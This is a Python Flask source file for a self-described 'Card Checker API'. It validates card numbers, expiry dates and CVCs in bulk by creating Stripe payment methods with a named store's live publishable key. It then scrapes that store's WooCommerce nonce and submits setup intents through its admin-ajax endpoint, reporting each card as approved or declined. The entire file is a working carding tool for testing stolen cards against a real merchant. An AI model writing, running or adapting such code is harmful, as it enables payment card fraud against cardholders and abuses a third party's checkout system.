from flask import Flask, request, jsonify
import time
import requests
import json
import os

app = Flask(__name__)

API_KEY = "OnyxEnv"

def process_card(ccx):
    try:
        # Parse card details
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return {
                "card": ccx,
                "response": "Invalid card format. Use: NUMBER|MM|YY|CVC",
                "status": "error"
            }
        
        n = parts[0].replace(" ", "")
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        full_card = f"{n}|{mm}|{yy}|{cvc}"
        
        print(f"🔍 Processing: {n[:6]}XXXXXX|{mm}|{yy}|{cvc}")
        
        # Step 1: Create payment method with Stripe
        data1 = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/f5ddf352d5; stripe-js-v3/f5ddf352d5; payment-element; deferred-intent',
            'referrer': 'https://hakfabrications.com',
            'key': 'pk_live_51PHFfEJakExu3YjjB9200dwvfPYV3nPS2INa1tXXtAbXzIl5ArrydXgPbd8vuOhNzCrq6TrNDL2nFGyZKD23gwQV00AS39rQEH',
        }

        headers1 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, timeout=30)
        response_data = response1.json()
        
        print(f"🎯 Stripe Response: {response_data}")
        
        # Check Stripe response for actual errors FIRST
        if 'error' in response_data:
            error_msg = response_data['error'].get('message', 'Card declined')
            return {
                "card": full_card,
                "response": error_msg,
                "status": "declined"
            }
            
        if 'id' not in response_data:
            return {
                "card": full_card,
                "response": "Your card was declined",
                "status": "declined"
            }
            
        payment_id = response_data['id']
        print(f"✅ Stripe Payment ID: {payment_id}")

        # Step 2: Get fresh session and nonce
        headers0 = {
            'authority': 'hakfabrications.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        # First get a fresh session
        session_response = requests.get('https://hakfabrications.com/my-account/add-payment-method/', headers=headers0, timeout=30)
        
        # Extract the nonce from the HTML response
        nonce_start = session_response.text.find('"createAndConfirmSetupIntentNonce":"')
        if nonce_start == -1:
            return {
                "card": full_card,
                "response": "Failed to extract nonce from page",
                "status": "error"
            }
        
        nonce_start += len('"createAndConfirmSetupIntentNonce":"')
        nonce_end = session_response.text.find('"', nonce_start)
        nonce = session_response.text[nonce_start:nonce_end]
        
        if not nonce:
            return {
                "card": full_card,
                "response": "Failed to extract nonce from page",
                "status": "error"
            }

        print(f"🔑 Nonce: {nonce}")

        # Step 3: Create and confirm setup intent with CORRECT endpoint
        ajax_headers = {
            'authority': 'hakfabrications.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://hakfabrications.com',
            'referer': 'https://hakfabrications.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        # Use the CORRECT endpoint
        response = requests.post(
            'https://hakfabrications.com/wp-admin/admin-ajax.php', 
            headers=ajax_headers, 
            data=data,
            timeout=30
        )
        
        print(f"📡 Merchant Response Status: {response.status_code}")
        print(f"📡 Merchant Response Text: {response.text}")
        
        # Parse the actual response
        try:
            result = response.json()
            print(f"📊 Parsed JSON: {result}")
            
            # Check for REAL success/decline
            if isinstance(result, dict):
                if result.get('success') is True:
                    return {
                        "card": full_card,
                        "response": "Card Added Successfully",
                        "status": "approved"
                    }
                elif result.get('success') is False:
                    error_msg = result.get('data', {}).get('message', 'Card declined')
                    return {
                        "card": full_card,
                        "response": error_msg,
                        "status": "declined"
                    }
            
            # If no clear success/failure, check the response content
            response_text = str(result).lower()
            
            if any(word in response_text for word in ['succeeded', 'success', 'true', 'active']):
                return {
                    "card": full_card,
                    "response": "Card Added Successfully", 
                    "status": "approved"
                }
            else:
                return {
                    "card": full_card,
                    "response": "Your card was declined",
                    "status": "declined"
                }
                
        except json.JSONDecodeError:
            # If response is not JSON, check text content
            response_text = response.text.lower()
            if any(word in response_text for word in ['succeeded', 'success', 'true', 'active']):
                return {
                    "card": full_card,
                    "response": "Card Added Successfully",
                    "status": "approved"
                }
            else:
                return {
                    "card": full_card,
                    "response": "Your card was declined",
                    "status": "declined"
                }
            
    except requests.exceptions.Timeout:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": "Request timeout",
            "status": "error"
        }
    except requests.exceptions.RequestException as e:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": f"Network error: {str(e)}",
            "status": "error"
        }
    except Exception as e:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": f"Processing error: {str(e)}",
            "status": "error"
        }

@app.route('/key=<key>/cc=<cc>')
def process_card_api(key, cc):
    if key != API_KEY:
        return jsonify({
            "error": "Invalid API key",
            "status": "error"
        }), 403
    
    result = process_card(cc)
    return jsonify(result)

@app.route('/')
def home():
    return jsonify({
        "message": "Card Checker API is running",
        "usage": "Use /key=OnyxEnv/cc=CARD_DETAILS to check cards",
        "format": "CARD_DETAILS format: NUMBER|MM|YY|CVC",
        "example": "/key=OnyxEnv/cc=4111111111111111|12|25|123"
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
